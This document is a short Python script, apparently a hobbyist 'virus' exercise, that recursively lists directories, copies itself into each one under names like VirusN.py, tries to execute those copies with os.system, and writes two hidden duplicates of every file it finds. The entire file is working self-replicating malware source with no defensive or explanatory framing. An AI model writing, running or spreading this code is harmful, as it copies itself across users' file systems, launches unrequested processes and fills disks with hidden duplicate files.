import os
import shutil # used in changing files
import random

#Intialize 
class Virus:
    
    def __init__(self, path=None, target_dir=None, repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 2
        self.own_path = os.path.realpath(__file__)
        
# To get the path
        
    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir = os.listdir(path)
        
        for file in current_dir:
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
#Make new file 
   
    def new_virus(self):
        for directory in self.target_dir:
            n = random.randint(0,10)
            new_script="Virus"+str(n)+".py"
            destination = os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination)
            os.system(new_script + " 1")
#Replcate   
    def replicate(self):
        for dir in self.target_dir:
            file_list_in_dir = os.listdir(dir)
            for file in file_list_in_dir:
                abs_path = os.path.join(dir,file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.repeat):
                        des = os.path.join(dir,("." + file + str(i)))
                        shutil.copyfile(source, des)
                        
    def Virus_action(self):
      self.list_directories(self.path)
      print(self.target_dir)
      self.replicate()
      self.new_virus()

if __name__=="__main__":
    current_directory = os.path.abspath("")
    Virus = Virus(path=current_directory)
    Virus.Virus_action()
